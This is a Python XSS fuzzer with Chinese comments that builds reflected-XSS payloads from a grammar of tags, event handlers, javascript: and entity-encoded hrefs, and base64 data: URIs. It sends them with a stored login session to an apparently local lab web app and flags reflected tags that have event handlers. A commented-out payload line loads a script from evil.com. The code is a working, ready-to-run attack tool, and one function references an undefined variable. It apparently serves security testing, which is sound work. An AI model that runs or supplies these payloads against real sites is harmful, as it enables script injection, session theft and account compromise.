# basic_fuzzer_sample.py
from bs4 import BeautifulSoup
from fuzzingbook.Grammars import Grammar, is_valid_grammar
from fuzzingbook.GrammarFuzzer import GrammarFuzzer
import random
from colorama import Back, Fore, Style, init
import json
import os, sys
sys.path.append(os.path.dirname(os.path.dirname(__file__)))
from modules.requests_handler import ApiSessionHandler
init(autoreset=True)
# --- 1. 定義一個簡單的數學運算語法 ---
# basic_fuzzer_sample.py 修正後的 XSS 語法


"""
# 
<select>
<math>
<form>
<frameset>
<marquee>
<style>

# 這
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
src=xxx:x
src="about:blank"
%3C
%3E
`
;
<svg><image href="x" onerror="alert(1)"></image></svg>
<svg>
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
'"<<Scrip<script> ;
<audio>
<video>
<input>
<body>
<div>
<object>
<iframe>
<embed>

"""
XSS_GRAMMAR: Grammar = {
    "<start>": ["<script>", "<ImageTags>", "<alink>", "<input>", "<normal>", "<ContextChange>"],
    
    # ; ' " ` < > %3E %3C  -->
    "<SpecialCharFronts>":[
        ";<",
        "\x00<",
        "'<",
        '"<',
        '`<',
        '<<',
        '<',
        '><',
        '>><',
        '%3E<',
        '%3C<',
        # '--><!-- ---><',
        # '--<'
    ],
    "<SpecialCharBacks>":[
        '>;',
        '>\x00',
        ">'",
        '>"',
        '>`',
        '><',
        '>>',
    ],
    "<typo>": [
        "text",
        "textarea",
        "select",
        "radio",
        "checkbox",
        "file",
        "password",
        "email",
        "url",
        "tel",
        "number",
        "date",
        "time",
        "datetime-local",
        "month",
        "week",
        "color",
        "hidden",
        "image",
        "submit",
        "button",
        "reset",
        "search",
        "tel",
        "url",
    ],

    "<ContextChange>": [
        '<SpecialCharFronts>object id=<canary> data=<ContextData> <trace_tag> <object<SpecialCharBacks>',
        '<SpecialCharFronts>object id=<canary> data=<ContextData> <event>=<fire>> <trace_tag> <Object<SpecialCharBacks>',
        '<SpecialCharFronts>iframe id=<canary> src=<ContextData> <event>=<fire>> <trace_tag> <iframe<SpecialCharBacks>',
        '<SpecialCharFronts>iframe id=<canary> src=<ContextData>> <trace_tag> <iframe<SpecialCharBacks>',
        '<SpecialCharFronts>embed id=<canary> src=<ContextData>> <trace_tag> <embed<SpecialCharBacks>',
        '<SpecialCharFronts>embed id=<canary> src=<ContextData> <event>=<fire>> <trace_tag> <embed<SpecialCharBacks>',
    ],

    "<escape>": [
        '<'
    ],
    
    "<ContextData>": [
        '"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg" type="text/html"',
        '"data:text/html;base64,PHNjcmlwdD5hbGVydCgxMTEpPC9zY3JpcHQ+" type="text/html"',
        '"data:text/html;base64,PHNjcmlwdD5hbGVydCgyMjIpPC9zY3JpcHQ+" type="text/html"',
        '"data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMzMzKTwvc2NyaXB0Pg==" type="text/html"',
        '"data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZyg1KTwvc2NyaXB0Pg==" type="text/html"',
        '"data:text/html;base64,PHNjcmlwdD5vcGVuKDk5KTwvc2NyaXB0Pg==" type="text/html"',
        '"data:text/html,<escape>script><fire><escape>/script>" type="text/html"',
        '"data:application/xml,<ImageTags>" type="application/xml',
        '"data:text/html,<escape>script><fire><escape>/script>" type="text/html"',
    ],

    "<input>": [
        '<SpecialCharFronts>input id=<canary> type=<typo> <event>=<fire><SpecialCharBacks>',
        '<SpecialCharFronts>Input id=<canary> type=<typo> <event>=<fire><SpecialCharBacks>',
        '<SpecialCharFronts>INPUT id=<canary> type=<typo> <event>=<fire><SpecialCharBacks>',
    ],

    "<normal>": [
        "<SpecialCharFronts>body id=<canary> <event>=<fire>> <trace_tag>  </body<SpecialCharBacks>",
        "<SpecialCharFronts>Body id=<canary> <event>=<fire>> <trace_tag> </Body<SpecialCharBacks>",
        "<SpecialCharFronts>BODY id=<canary> <event>=<fire>> <trace_tag> </BODY<SpecialCharBacks>",
        # "<SpecialCharFronts>div id=<canary> <event>=<fire>> <trace_tag> </div<SpecialCharBacks>",
        # "<SpecialCharFronts>Div id=<canary> <event>=<fire>> <trace_tag> </Div<SpecialCharBacks>",
        # "<SpecialCharFronts>DIV id=<canary> <event>=<fire>> <trace_tag> </DIV<SpecialCharBacks>",
    ],


    "<script>" :[
        '<SpecialCharFronts>script id=<canary>> <fire> </Script<SpecialCharBacks>',
        '<SpecialCharFronts>SCript id=<canary>> <fire> </ScRipt<SpecialCharBacks>',
        '<SpecialCharFronts>Scri><SpecialCharFronts>scriPT id=<canary>> <fire> </scriPT<SpecialCharBacks>',
        '<SpecialCharFronts>Script id=<canary>> <fire> </script<SpecialCharBacks>',
        '<SpecialCharFronts>Script id=<canary>> <fire> </script<SpecialCharBacks>',
    ],

    "<alink>": [
        '<SpecialCharFronts>a id=<canary> <href>><trace_tag> </a<SpecialCharBacks>',
        '<SpecialCharFronts>A id=<canary> <href>><trace_tag> </A<SpecialCharBacks>',
    ],
    
    "<ImageTag>": [
        '<SpecialCharFronts>image',
        '<SpecialCharFronts>IMg',
        '<SpecialCharFronts>IMG',
        '<SpecialCharFronts>IMAge',
    ],

    "<ImageTags>": [
        '<SpecialCharFronts>IMg id=<canary> <src_img> <event>=<fire>>',
        '<SpecialCharFronts>IMG id=<canary> <src_img> <event>=<fire>>',
        # '<SpecialCharFronts>image id=<canary> <src_img> <event>=<fire>>',
        # '<SpecialCharFronts>IMAge id=<canary> <src_img> <event>=<fire>>',
        '<SpecialCharFronts>svg id=<canary> <event>=<fire>> <ImageTag> <href> <event>=<fire>> </svg<SpecialCharBacks>',
        '<SpecialCharFronts>SVG id=<canary> <event>=<fire>> <ImageTag> <href> <event>=<fire>> </SVG<SpecialCharBacks>',
        '<SpecialCharFronts>sVG id=<canary> <event>=<fire>> <ImageTag> <href> <event>=<fire>> </sVG<SpecialCharBacks>',
    ],

    "<href>": [
        'href=x',
        'HRef=javascript:<fire>',
        'href=javascript:<fire>',
        'href=jAVascrIPT:<fire>',
        'href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:<fire>',
        'href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:<fire>',
        'href="javas&#99;ript:<fire>',
    ],

    # "<media>" :[
    #     '<SpecialCharFronts>audio <src_img> <event>=<fire>>',
    #     '<SpecialCharFronts>video <src_img> <event>=<fire>>',
    # ],
    
    "<src_img>":[
        'src',
        'src=<ImageTags>'
        'src=x',
        'src/=/x',
        'src=/xxx:x/',
        'src=about:blank',
    ],
    
    "<fire>": [
        "alert(<trace_tag>)",
        # "Alert(<trace_tag>)",
        #"prompt(<trace_tag>)",
        # "Prompt(<trace_tag>)",
        #"confirm(<trace_tag>)",
        # "Confirm(<trace_tag>)",
        # "Open(<trace_tag>)",
       # "open()",
       # "console.log(<trace_tag>)",
        # "Console.log(<trace_tag>)",
        # "eval('<fire>')",
        #"setTimeout(<fire>,'1000')"
        # "(function(){var s=document.createElement('script');s.src='http://evil.com/xss.js';document.body.appendChild(s);})()"
    ],

    # "<event>": [
    #     "onerror", 
    #     "onload", 
    #     "onfocus",
    #     "onpageshow",
    #     "oncopy",
    #     "oncut",
    #     "onpaste",
    #     "ontoggle",
    #     "onwaiting",
    #     "onvolumechange",
    #     "ontimeupdate",
    #     "onsuspend",
    #     "onstalled",
    #     "onseeking",
    #     "onseeked",
    #     "onratechange",
    #     "onprogress",
    #     "onplaying",
    #     "onplay",
    #     "onpause",
    #     "onloadstart",
    #     "onloadedmetadata",
    #     "onloadeddata",
    #     "onended",
    #     "onemptied",
    #     "ondurationchange",
    #     "oncuechange",
    #     "oncanplaythrough",
    #     "oncanplay",
    #     "onabort",
    #     "draggable=\"true\" ondrag",
    #     "onwheel",
    #     "ondblclick",
    #     "onclick",
    #     "onkeyup",
    #     "onkeypress",
    #     "onkeydown",
    #     "onsubmit",
    #     "onselect",
    #     "onsearch",
    #     "onreset",
    #     "oninvalid",
    #     "oninput",
    #     "oncontextmenu",
    #     "onchange",
    #     "onblur",
    #     "onunload",
    #     "onresize",
    # ],
    "<event>": [
    "onerror",       # 常見，圖片/腳本載入失敗時觸發
    "onload",        # 元素載入時
    #"onclick",       # 點擊時
    #"onmouseover",   # 滑鼠懸停時
    #"onfocus",       # 焦點時（適合 input）
    #"onblur",        # 失焦時
    #"onchange",      # 值變化時（適合 form）
    # "onsubmit",      # 表單提交時
    #"oninput",       # 輸入時（適合 text input）
    # "onabort",       # 中斷時（媒體）
    "onwheel",       # 滾輪時
    #"onresize",
    #"oncopy",
    #"draggable=\"true\" ondrag",
    #"oncontextmenu"  # 右鍵菜單時（偏門但有用）
    ],
    "<canary>" : ["f0a182"],
    "<trace_tag>": ["'a'", "'b'", "'c'", "'ss'", "'gg'", "'zz'", "'ff'", "'qq'", "'x'", "'2'", "'ak'", "'911'", "'por'", "'sche'", "'zqw'"] 
}

def generatePayload(): 
    xss_fuzzer = GrammarFuzzer(XSS_GRAMMAR)
    return xss_fuzzer.fuzz()

def GetLoginSession():
    with open(ResourcesPool + "LoginSession.json", "r", encoding="utf-8") as f:
        return json.load(f)

def LoginCheck(LoginSession):
    RequestHandler = ApiSessionHandler(LoginSession["Cookies"])
    res = RequestHandler.SendApiRequest("get", "http://192.168.11.129:8080/administrator/", None, None)
    if len(res.text) > 30000:
        print(f"{Fore.GREEN}Login Success{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Login Failed{Style.RESET_ALL}")

ResourcesPool = "../ResourcesPool/"

def analyze_reflected_xss(html_source, canary_id, payload_fragment):
    """
    靜態分析 requests 回傳的 HTML
    html_source: response.text
    canary_id: 你在 grammar 中設定的 id (例如 "FUZZ_ID")
    payload_fragment: Payload 的一部分，用來檢查是否被轉義
    """
    soup = BeautifulSoup(html_source, 'lxml') # 需安裝 lxml: pip install lxml
    
    report = {
        "is_reflected": False,      # 是否反射
        "is_effective": False,      # 是否有效 (Tag 成功注入且沒被轉義)
        "details": "",
        "HighRisk": False,
        "fullTag": ""
    }

    # 1. 快速檢查: 整個 HTML 裡有沒有出現我們的 ID 或 Payload 片段
    if canary_id not in html_source:
        return report # 沒反射，直接結束

    report["is_reflected"] = True
    report["details"] += f"Found Canary ID: {canary_id}. "

    # 2. 精準檢查: 檢查該 ID 所在的 Tag
    # 這裡假設你的 grammar 會產生如 <tag id="canary_id">
    target_tag = soup.find(attrs={"id": canary_id}) or soup.find(attrs={"class": canary_id})

    if target_tag:
        # 檢查是否被轉義 (Sanitized)
        # 如果 Tag 成功被解析出來，代表 < > 沒有被轉義
        report["is_effective"] = True
        report["fullTag"] = str(target_tag)
        report["details"] += f"Tag <{target_tag.name}> injected successfully. "
        
        # 檢查危險屬性 (Event Handlers)
        # 找出所有 on 開頭的屬性
        events = [attr for attr in target_tag.attrs if attr.lower().startswith("on")]
        if events:
            report["HighRisk"] = True
            report["details"] += f"{Fore.RED}Events found: {events}. (High Risk!) {response.status_code}{Style.RESET_ALL}"
        else:
            report["details"] += f"{Fore.YELLOW}Tag injected but no events found (maybe stripped?).{Style.RESET_ALL}"
            
    else:
        # 雖然字串存在，但無法透過 id 找到 element，通常代表:
        # 1. 在註解 中
        # 2. < > 被轉義變成了 &lt; &gt; (導致 parser 認不出它是 tag)
        # 3. 在 <script> 字串變數中
        # 檢查是否被轉義
        if "&lt;" in html_source and payload_fragment in html_source:
             report["details"] += f"{Fore.YELLOW}Payload reflected but SANITIZED (HTML Entities).{Style.RESET_ALL}"
        else:
             report["details"] += f"{Fore.YELLOW}Payload reflected inside Comment or JS String context.{Style.RESET_ALL}"

    return report

if __name__ == '__main__':
    LoginSession = GetLoginSession()
    LoginCheck(LoginSession)
    requestHandler = ApiSessionHandler(LoginSession["Cookies"])
    hashes = {}
    with open(ResourcesPool + "hashToApi.json", "r", encoding="utf-8") as f:
        hashes = json.load(f)
    for k, v in hashes.items():
        # print(v)
        data = hashes[k]['body']
        temp = data
        flag = True
        while flag:
            for i in data:
                if data[i] == "Fuzzable":
                    payload = generatePayload()
                    temp[i] = payload
                    # print(f"{Fore.YELLOW}Fuzzing {hashes[k]['url']} Param: {i}{Style.RESET_ALL}")
                    # print(payload)
            response = requestHandler.SendApiRequest(hashes[k]['method'].upper(), hashes[k]['url'], hashes[k]['headers'], temp)
            # print(response.status_code)
            analyze = analyze_reflected_xss(response.text, "f0a182", "alert")
            if analyze["is_reflected"]:
                if analyze["is_effective"]:
                    if analyze["HighRisk"]:
                        print(temp)
                        print(f"{Style.BRIGHT}Reflected XSS Found {Style.RESET_ALL}")
                        print(f"{Back.RED}Full Tag: {analyze['fullTag']}{Style.RESET_ALL}")
                        print(f"Details: {analyze['details']}")
                    else:
                        print(f"{Fore.YELLOW}(No on Events). URL{Style.RESET_ALL}")
                        print(f"Details: {analyze['details']}")
                else:
                    print(f"{Fore.YELLOW}Payload was Sanitized.{Style.RESET_ALL}")
                    print(f"Details: {analyze['details']}")
            else: 
                print(f"{Fore.GREEN}No reflection detected {Style.RESET_ALL}")

            if response.status_code >= 200 and response.status_code < 400:
                flag = False
            else:
                print(f"{Fore.RED}Retrying... Status Code: {response.status_code}{Style.RESET_ALL}")
    # x = []
    # for _ in range(10):
    #     payload = generatePayload()
    #     x.append(payload)
    #     print(f"{Fore.BLUE}{payload}{Style.RESET_ALL}")

    # with open("xss_payloads.html", "w", encoding="utf-8") as f:
    #     for payload in x:
    #         f.write(payload + "\n")